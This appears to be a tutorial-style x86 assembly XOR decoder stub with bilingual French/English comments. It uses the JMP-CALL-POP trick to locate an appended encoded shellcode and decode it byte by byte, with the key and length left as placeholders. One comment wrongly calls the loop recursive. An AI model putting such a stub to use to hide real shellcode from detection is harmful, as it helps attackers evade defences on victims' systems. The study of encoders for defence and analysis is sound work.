BITS 32

jmp short three

one:
	pop esi                        ; Ici on récupère le shellcode modifié qu'on stock dans le registre esi / Here we retrieve the modified shellcode and store it in the esi register
	xor eax, eax                   ; On met les registres eax, ebx et ecx à 0 car le registre AX / We set the eax, ebx and ecx registers to 0 because the AX
	xor ebx, ebx                   ; va contenir notre clé, le registre BX la taille du shellcode à déchiffrer / will contain our key, the BX register the size of the shellcode to be decrypted
	xor ecx, ecx                   ; et CX qui va être notre compteur / and CX which will be our counter
	mov al, [cle]                  ; On met la clé dans la partie basse du registre AX / The key is placed in the lower part of the AX register.
	mov bl, [taille du shellcode]  ; On met la taille du shellcode dans la partie basse du registre BX / Set the shellcode size in the lower part of the BX register

two:
	xor [esi + ecx], eax           ; On se positionne dans [esi + ecx] et xor l'octet présent avec la clé contenu dans eax / We position ourselves in [esi + ecx] and xor the byte present with the key contained in eax
	inc ecx                        ; On incrémente ecx pour passer à esi + (n+1) pour le prochain octet / We increment ecx to esi + (n+1) for the next byte.
	cmp ebx, ecx                   ; On test si notre compteur ecx == la taille du shellcode / We test if our ecx counter == the shellcode size
	jne two                        ; Si le test n'est pas bon on jump à nouveau dans la fonction two / If the test is unsuccessful, jump back into the two function. 
                                       ; (Ici two est une fonction récursive) / (Here two is a recursive function)
	jmp short four                 ; Si le test est bon alors on jump dans la fonction four pour sortir / If the test is successful, jump to the four function to exit.

three:
	call one

four:
